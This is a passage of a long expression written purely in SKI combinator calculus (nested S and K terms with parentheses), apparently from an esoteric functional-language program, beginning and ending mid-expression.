K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((S)(K))(K))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((